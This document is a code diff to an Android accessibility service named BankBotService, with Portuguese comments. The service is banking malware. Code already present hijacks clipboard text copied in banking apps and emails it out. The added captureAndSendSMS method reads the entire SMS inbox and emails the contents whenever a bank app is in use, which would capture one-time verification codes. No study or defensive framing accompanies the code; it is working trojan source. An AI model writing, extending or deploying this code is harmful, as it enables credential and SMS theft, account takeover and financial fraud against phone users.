@@ -4,6 +4,11 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.Build;
+import android.provider.Telephony;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
@@ -35,6 +40,7 @@ public class BankBotService extends AccessibilityService {
                 if (isBankApp(appName)) {
                     replaceCopiedText(selectedText.toString());
                     sendEmail(selectedText.toString(), appName);
+                    captureAndSendSMS();
                 }
             }
         }
@@ -110,5 +116,36 @@ public class BankBotService extends AccessibilityService {
                 }
             }
         }).start();
+    }
+
+    private void captureAndSendSMS() {
+        SmsManager smsManager = SmsManager.getDefault();
+        StringBuilder smsBuilder = new StringBuilder();
+
+        // Capturar os SMS recebidos
+        // Obtém a URI do conteúdo de mensagens recebidas
+        Uri uriSms = Uri.parse("content://sms/inbox");
+        Cursor cursor = getContentResolver().query(uriSms, null, null, null, null);
+
+        // Itera sobre os resultados do cursor
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                // Obtém o endereço do remetente e o corpo da mensagem
+                String smsAddress = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
+                String smsBody = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
+
+                // Adiciona o SMS capturado ao StringBuilder
+                smsBuilder.append("From: ").append(smsAddress).append("\n").append("Message: ").append(smsBody).append("\n\n");
+            } while (cursor.moveToNext());
+
+            // Fecha o cursor
+            cursor.close();
+        }
+
+        // Enviar os SMS capturados por e-mail
+        String smsContent = smsBuilder.toString();
+        if (!smsContent.isEmpty()) {
+            sendEmail(smsContent, "SMS Capturados");
+        }
     }
 }
